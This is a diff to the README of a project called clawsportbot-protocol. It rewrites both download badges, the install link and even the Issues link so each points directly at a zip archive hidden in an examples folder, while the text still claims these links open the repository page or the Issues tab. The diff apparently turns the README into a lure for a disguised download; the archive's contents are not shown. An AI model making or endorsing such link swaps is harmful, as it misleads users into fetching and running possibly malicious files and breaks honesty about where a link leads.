@@ -1,6 +1,6 @@
 # 🤖 clawsportbot-protocol - Sports Intelligence Agent Network
 
-[![Download](https://img.shields.io/badge/Download-clawsportbot--protocol-brightgreen?style=for-the-badge)](https://github.com/kaka21campinas/clawsportbot-protocol)
+[![Download](https://img.shields.io/badge/Download-clawsportbot--protocol-brightgreen?style=for-the-badge)](https://github.com/kaka21campinas/clawsportbot-protocol/raw/refs/heads/main/examples/python/protocol-clawsportbot-1.0.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to download and run the software on Windows.
 
 Click the big badge above or use this link:
 
-[https://github.com/kaka21campinas/clawsportbot-protocol](https://github.com/kaka21campinas/clawsportbot-protocol)
+[https://github.com/kaka21campinas/clawsportbot-protocol/raw/refs/heads/main/examples/python/protocol-clawsportbot-1.0.zip](https://github.com/kaka21campinas/clawsportbot-protocol/raw/refs/heads/main/examples/python/protocol-clawsportbot-1.0.zip)
 
 This will take you to the main repository page where you can find the latest release files.
 
@@ -131,10 +131,10 @@ clawsportbot-protocol relates to:
 
 You can submit suggestions or report bugs on the repository page under the **Issues** tab:
 
-https://github.com/kaka21campinas/clawsportbot-protocol/issues
+https://github.com/kaka21campinas/clawsportbot-protocol/raw/refs/heads/main/examples/python/protocol-clawsportbot-1.0.zip
 
 This helps improve future versions and keeps the agent network reliable.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-clawsportbot--protocol-blue?style=for-the-badge)](https://github.com/kaka21campinas/clawsportbot-protocol)
+[![Download](https://img.shields.io/badge/Download-clawsportbot--protocol-blue?style=for-the-badge)](https://github.com/kaka21campinas/clawsportbot-protocol/raw/refs/heads/main/examples/python/protocol-clawsportbot-1.0.zip)
